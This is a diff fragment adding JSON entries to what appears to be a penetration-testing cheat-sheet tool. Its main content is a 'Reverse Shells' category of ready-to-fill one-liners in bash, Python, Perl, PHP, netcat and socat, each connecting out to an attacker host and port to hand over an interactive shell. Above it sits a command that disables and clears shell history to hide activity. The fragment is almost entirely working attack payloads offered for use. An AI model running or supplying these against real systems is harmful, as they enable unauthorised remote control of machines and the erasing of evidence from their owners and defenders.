+          "template": "unset HISTFILE ; export HISTSIZE=0 ; cat /dev/null > ~/.bash_history && history -c"
+        }
+      ]
+    },
+    {
+      "id": "shells",
+      "title": "Reverse Shells",
+      "desc": "One-liners across languages",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M12 3C7.5 3 4 6.5 4 10.5c0 2.5 1.2 4.5 3 5.8V18h10v-1.7c1.8-1.3 3-3.3 3-5.8C20 6.5 16.5 3 12 3z\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linejoin=\"round\"/><circle cx=\"9\" cy=\"10\" r=\"2\" stroke=\"#FCD200\" stroke-width=\"1.3\"/><circle cx=\"15\" cy=\"10\" r=\"2\" stroke=\"#FCD200\" stroke-width=\"1.3\"/><path d=\"M10 15v3M12 15v3M14 15v3\" stroke=\"#FCD200\" stroke-width=\"1.3\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-exploit",
+      "items": [
+        {
+          "id": "shells-001",
+          "name": "Bash /dev/tcp",
+          "description": "No interpreter beyond bash.",
+          "template": "bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
+        },
+        {
+          "id": "shells-002",
+          "name": "Python3",
+          "description": "Cross-distro.",
+          "template": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/bash\",\"-i\"])'"
+        },
+        {
+          "id": "shells-003",
+          "name": "Perl",
+          "description": "Old, reliable.",
+          "template": "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'"
+        },
+        {
+          "id": "shells-004",
+          "name": "PHP",
+          "description": "Useful from a webshell pivot.",
+          "template": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"
+        },
+        {
+          "id": "shells-005",
+          "name": "nc traditional",
+          "description": "Old netcat with -e.",
+          "template": "nc -e /bin/bash {LHOST} {LPORT}"
+        },
+        {
+          "id": "shells-006",
+          "name": "nc fifo (no -e)",
+          "description": "When -e is stripped.",
+          "template": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
+        },
+        {
+          "id": "shells-007",
+          "name": "Socat — full TTY",
+          "description": "Best stability after upgrade.",
+          "template": "socat file:`tty`,raw,echo=0 tcp-listen:{LPORT}  # listener\\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}  # target"
+        }
+      ]
+    }
+  ]
+}
